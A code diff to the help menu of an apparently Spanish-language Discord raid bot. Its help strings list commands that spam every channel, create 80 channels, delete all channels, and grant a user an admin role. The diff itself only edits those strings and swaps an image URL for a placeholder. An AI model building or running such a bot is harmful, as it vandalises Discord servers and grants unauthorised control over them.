@@ -433,7 +433,7 @@ paginas = [
             "`$spam` –\n"
             "**Hace spam en todos los canales.**\n"
             "`$raid` –\n"
-            "**Crea una cantidad personalizada de canales.**\n"
+            "**Crea una cantidad de 80 canales.**\n"
             "`$nuke` –\n"
             "**Borra todos los canales del servidor.**\n"
         )
@@ -463,7 +463,7 @@ paginas = [
             "`$ks (ID servidor)` –\n"
             "**Programa 5 comandos al meter el bot.**\n"
             "`$vs (ID servidor)` –\n"
-            "**Raidea solo si Chuyin está dentro del servidor.**\n"
+            "**Raidea solo si el Bot está dentro del servidor.**\n"
             "`$da (ID usuario) (ID servidor)` –\n"
             "**Crea un rol admin y se lo da al usuario si Chuyin está en el servidor.\n"
             "`$md` –\n"
@@ -497,8 +497,7 @@ class HelpView(View):
             description=page["descripcion"],
             color=0xBDC3C7
         )
-        embed.set_thumbnail(url="https://i.postimg.cc/L5J3wn7W/43-sin-titulo-20251118060548.png")
-        embed.set_footer(text="Chu-yin", icon_url="https://i.postimg.cc/TP1CKVPH/chuyixse.jpg")
+        embed.set_thumbnail(url="URL DE LA FOTO QUE LE QUIERES PONER AL COMANDO")
         await interaction.response.edit_message(embed=embed, view=self)
 
     @discord.ui.button(label="Anterior", style=discord.ButtonStyle.primary)
